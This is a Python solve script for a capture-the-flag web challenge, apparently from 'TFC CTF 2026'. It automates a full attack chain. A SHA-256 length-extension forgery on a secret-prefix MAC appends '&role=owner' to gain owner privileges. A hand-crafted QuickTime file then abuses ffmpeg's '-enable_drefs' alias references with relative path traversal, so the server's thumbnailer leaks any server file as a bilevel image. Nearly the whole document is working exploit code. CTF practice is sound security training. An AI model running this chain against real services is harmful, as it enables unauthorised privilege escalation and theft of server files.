#!/usr/bin/env python3
"""
Huddle (TFC CTF 2026, web) - end-to-end solve.

Chain:
  1. Register an ordinary member.
  2. GET /api/invite returns token=base64url("team=main&email=<you>&role=member")
     and sig=SHA256(secret || token_plaintext)  -- a secret-prefix MAC, not HMAC.
     SHA-256 length extension appends "&role=owner"; the server's query parser
     keeps the LAST value, so POST /api/join promotes us to owner.
     Secret length is 24 (found by sweeping 1..64).
  3. As owner, POST /api/workspace/settings {"video_messages": true}.
  4. The thumbnailer runs:
        ffmpeg -y -loglevel error -enable_drefs 1 -use_absolute_path 1 \
               -i /tmp/huddle/uploads/<file_id> -frames:v 1 -q:v 2 \
               /tmp/huddle/thumbs/<rand>.jpg
     -enable_drefs 1 makes FFmpeg honour QuickTime "alis" data references, i.e.
     a track whose sample data lives in a *different* file on disk.
     We hand-build a .mov with:
        - a dref/alis entry using nlvl_from/nlvl_to relative traversal
        - one rawvideo sample description with depth=1 (1 bit per pixel)
        - stsz = W*H/8, stco = byte offset inside the referenced file
     FFmpeg then renders W*H bits of an arbitrary server file as a black/white
     image. Because it is bilevel, the lossy JPEG survives thresholding and the
     bytes come back exactly.
Usage: python3 solve.py [base_url] [path_to_read]
"""
import base64, json, os, struct, subprocess, sys, urllib.error, urllib.request

if len(sys.argv) > 1 and sys.argv[1] in ("-h", "--help"):
    print(__doc__.strip())
    sys.exit(0)

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://k57c56d7e0a14c3000ca43f7be0e9aea9.playat.flagyard.com"
TARGET = sys.argv[2] if len(sys.argv) > 2 else "/flag.txt"

# ---------------------------------------------------------------- SHA-256 core
_K = [0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2]

def _rotr(x, n): return ((x >> n) | (x << (32 - n))) & 0xffffffff

def _compress(state, block):
    w = list(struct.unpack('>16I', block))
    for i in range(16, 64):
        s0 = _rotr(w[i-15],7) ^ _rotr(w[i-15],18) ^ (w[i-15] >> 3)
        s1 = _rotr(w[i-2],17) ^ _rotr(w[i-2],19) ^ (w[i-2] >> 10)
        w.append((w[i-16] + s0 + w[i-7] + s1) & 0xffffffff)
    a,b,c,d,e,f,g,h = state
    for i in range(64):
        S1 = _rotr(e,6) ^ _rotr(e,11) ^ _rotr(e,25)
        ch = (e & f) ^ ((~e & 0xffffffff) & g)
        t1 = (h + S1 + ch + _K[i] + w[i]) & 0xffffffff
        S0 = _rotr(a,2) ^ _rotr(a,13) ^ _rotr(a,22)
        maj = (a & b) ^ (a & c) ^ (b & c)
        t2 = (S0 + maj) & 0xffffffff
        h,g,f,e,d,c,b,a = g,f,e,(d+t1)&0xffffffff,c,b,a,(t1+t2)&0xffffffff
    return [(x + y) & 0xffffffff for x, y in zip(state, [a,b,c,d,e,f,g,h])]

def _pad(msglen):
    return b'\x80' + b'\x00' * ((55 - msglen) % 64) + struct.pack('>Q', msglen * 8)

def length_extend(sig_hex, data, append, key_len):
    """Return (new_message_without_key, new_sig_hex) for SHA256(key || data)."""
    state = list(struct.unpack('>8I', bytes.fromhex(sig_hex)))
    glue = _pad(key_len + len(data))
    new_data = data + glue + append
    total = key_len + len(new_data)
    msg = append + _pad(total)
    for i in range(0, len(msg), 64):
        state = _compress(state, msg[i:i+64])
    return new_data, ''.join('%08x' % x for x in state)

# ---------------------------------------------------------------- HTTP helpers
SID = None

def call(path, data=None, ctype='application/json', raw=False):
    body = data if raw else (json.dumps(data).encode() if data is not None else None)
    hdr = {'Content-Type': ctype}
    if SID:
        hdr['Cookie'] = 'sid=' + SID
    req = urllib.request.Request(BASE + path, data=body, headers=hdr)
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return r.status, r.read(), r.headers
    except urllib.error.HTTPError as e:
        return e.code, e.read(), e.headers

# ---------------------------------------------------------------- MOV builder
def _box(tag, payload): return struct.pack('>I', len(payload) + 8) + tag + payload
def _full(tag, ver, flags, payload): return _box(tag, bytes([ver]) + flags.to_bytes(3, 'big') + payload)

_MATRIX = struct.pack('>9i', 0x00010000,0,0, 0,0x00010000,0, 0,0,0x40000000)

def _alis(path: bytes, nlvl_from, nlvl_to):
    body  = b'\x00' * 10
    body += bytes([0]) + b'\x00' * 27          # volume length + volume name
    body += b'\x00' * 12
    body += bytes([0]) + b'\x00' * 63          # file name length + file name
    body += b'\x00' * 16
    body += struct.pack('>HH', nlvl_from, nlvl_to)
    body += b'\x00' * 16
    p = path + (b'\x00' if len(path) & 1 else b'')
    body += struct.pack('>HH', 2, len(p)) + p  # TLV type 2 = absolute path
    body += struct.pack('>HH', 0xFFFF, 0)      # terminator
    return _full(b'alis', 0, 0, body)

def build_mov(path: bytes, w, h, nlvl_from, nlvl_to, offset):
    """1-bit-per-pixel rawvideo track whose samples live in `path`."""
    stsd_entry  = b'\x00' * 6 + struct.pack('>H', 1)
    stsd_entry += struct.pack('>HH', 0, 0) + b'\x00' * 4
    stsd_entry += struct.pack('>II', 0, 0)
    stsd_entry += struct.pack('>HH', w, h)
    stsd_entry += struct.pack('>II', 0x00480000, 0x00480000)
    stsd_entry += struct.pack('>I', 0) + struct.pack('>H', 1)
    stsd_entry += bytes([0]) + b'\x00' * 31
    stsd_entry += struct.pack('>Hh', 1, -1)             # depth = 1 bpp
    stbl = _box(b'stbl',
        _full(b'stsd', 0, 0, struct.pack('>I', 1) + _box(b'raw ', stsd_entry)) +
        _full(b'stts', 0, 0, struct.pack('>III', 1, 1, 1000)) +
        _full(b'stsc', 0, 0, struct.pack('>IIII', 1, 1, 1, 1)) +
        _full(b'stsz', 0, 0, struct.pack('>III', w * h // 8, 1, 1)[:8] + struct.pack('>I', 1)) +
        _full(b'stco', 0, 0, struct.pack('>II', 1, offset)))
    dinf = _box(b'dinf', _full(b'dref', 0, 0, struct.pack('>I', 1) + _alis(path, nlvl_from, nlvl_to)))
    minf = _box(b'minf', _full(b'vmhd', 0, 1, struct.pack('>HHHH', 0, 0, 0, 0)) + dinf + stbl)
    mdia = _box(b'mdia',
        _full(b'mdhd', 0, 0, struct.pack('>IIII', 0, 0, 1000, 1000) + struct.pack('>HH', 0x55c4, 0)) +
        _full(b'hdlr', 0, 0, b'mhlr' + b'vide' + b'\x00' * 13) + minf)
    tkhd = _full(b'tkhd', 0, 7,
        struct.pack('>IIIII', 0, 0, 1, 0, 1000) + b'\x00' * 8 +
        struct.pack('>HHHH', 0, 0, 0, 0) + _MATRIX + struct.pack('>II', w << 16, h << 16))
    mvhd = _full(b'mvhd', 0, 0,
        struct.pack('>IIII', 0, 0, 1000, 1000) + struct.pack('>iHH', 0x00010000, 0x0100, 0) +
        b'\x00' * 8 + _MATRIX + b'\x00' * 24 + struct.pack('>I', 2))
    moov = _box(b'moov', mvhd + _box(b'trak', tkhd + mdia))
    ftyp = _box(b'ftyp', b'qt  ' + struct.pack('>I', 0x200) + b'qt  ')
    return ftyp + moov

def jpeg_to_bytes(jpg_path, w, h):
    px = subprocess.run(['ffmpeg', '-v', 'error', '-i', jpg_path, '-frames:v', '1',
                         '-pix_fmt', 'gray', '-f', 'rawvideo', '-'],
                        capture_output=True, check=True).stdout
    bits = [1 if px[i] < 128 else 0 for i in range(w * h)]
    out = bytearray()
    for i in range(0, len(bits), 8):
        b = 0
        for j in range(8):
            b = (b << 1) | bits[i + j]
        out.append(b)
    return bytes(out)

def read_remote(path, size=256, offset=0, nlvl_from=4, w=64):
    h = size * 8 // w
    nlvl_to = path.strip('/').count('/') + 1
    mov = build_mov(path.encode(), w, h, nlvl_from, nlvl_to, offset)
    _, b, _ = call('/api/files/upload', mov, 'application/octet-stream', raw=True)
    fid = json.loads(b)['file_id']
    _, b, _ = call('/api/files/thumbnail', {'file_id': fid})
    j = json.loads(b)
    if 'thumb_url' not in j:
        return None
    _, img, _ = call(j['thumb_url'])
    open('_solve_thumb.jpg', 'wb').write(img)
    return jpeg_to_bytes('_solve_thumb.jpg', w, h)

# ---------------------------------------------------------------- solve
def main():
    global SID
    email = 'solver%d@mail.com' % (os.getpid() * 7919 % 10 ** 8)
    st, b, hdrs = call('/api/register', {'email': email, 'password': 'Passw0rd!123'})
    assert st == 200, b
    SID = hdrs['Set-Cookie'].split('sid=')[1].split(';')[0]
    print('[+] registered %s as member' % email)

    _, b, _ = call('/api/invite')
    inv = json.loads(b)
    token = base64.urlsafe_b64decode(inv['token'] + '=' * (-len(inv['token']) % 4))
    print('[+] invite token plaintext: %s' % token.decode())

    for key_len in range(1, 65):
        new_tok, new_sig = length_extend(inv['sig'], token, b'&role=owner', key_len)
        st, b, _ = call('/api/join', {
            'token': base64.urlsafe_b64encode(new_tok).decode().rstrip('='),
            'sig': new_sig})
        if st == 200:
            print('[+] length extension succeeded, secret length = %d -> %s' % (key_len, b.decode()))
            break
    else:
        raise SystemExit('[-] length extension failed')

    _, b, _ = call('/api/workspace/settings', {'video_messages': True})
    print('[+] video messages enabled: %s' % b.decode())

    for nlvl_from in range(1, 10):
        data = read_remote(TARGET, 256, 0, nlvl_from)
        if data:
            print('[+] dref traversal depth nlvl_from=%d' % nlvl_from)
            print('[+] %s = %r' % (TARGET, data.rstrip(b'\x00')))
            return
    raise SystemExit('[-] file read failed')

if __name__ == '__main__':
    main()
